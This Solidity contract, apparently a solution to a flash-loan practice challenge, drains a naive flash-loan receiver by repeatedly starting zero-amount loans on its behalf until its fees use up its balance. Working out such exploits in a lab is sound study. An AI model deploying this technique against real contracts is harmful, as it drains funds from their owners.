pragma solidity ^0.8.0;

//import "@openzeppelin/contracts/utils/Address.sol";
//import "hardhat/console.sol";

interface LenderPool {
    function fixedFee() external pure returns (uint256);
    function flashLoan(address borrower, uint256 borrowAmount) external;
}

// @dev drains the receiver of all funds
contract LenderExploiter {

    //using Address for address; // simplifies contract function calls w/o interface

    LenderPool private pool; // NaiveReceiverLenderPool
    address private receiver; // FlashLoanReceiver

    constructor(address _pool, address _receiver) {
        pool = LenderPool(_pool);
        receiver = _receiver;
    }

    function initiateFlashLoan() external {
        uint256 loops = receiver.balance / pool.fixedFee();
        //console.log("loops:",loops);

        for (uint256 i; i<loops; i++) {
            pool.flashLoan(receiver,0);    
        }
    }

}